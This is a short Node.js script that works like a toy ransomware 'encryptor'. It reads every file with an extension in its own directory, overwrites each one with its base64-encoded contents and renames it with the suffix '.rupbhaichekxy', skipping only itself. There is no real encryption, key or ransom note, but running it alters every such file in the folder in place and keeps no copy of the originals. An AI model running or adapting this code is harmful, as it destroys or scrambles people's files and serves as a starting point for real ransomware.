console.clear()
const fs = require("fs")
const path = require("path")

const encryptedExtension = ".rupbhaichekxy"

fs.readdir(path.join(__dirname), (err, data) => {
  if (err) console.log("An error occured during get the file names")
  
//

  data.forEach((file) => {
    if (file === path.basename(__filename) || path.extname(file) === "") {
      return null
    }
    const encryptedFile = file + encryptedExtension
    if (path.extname(file) === encryptedExtension) {
      return null
    } else {
      const fileBufferData = fs.readFileSync(path.join(__dirname, file))
      const fileData = fileBufferData.toString("base64")
      fs.writeFileSync(path.join(__dirname, file), fileData)

      fs.rename(
        path.join(__dirname, file),
        path.join(__dirname, encryptedFile),
        (err) => {
          if (err) console.log("An error occ")
        }
      )
    }
  })
})
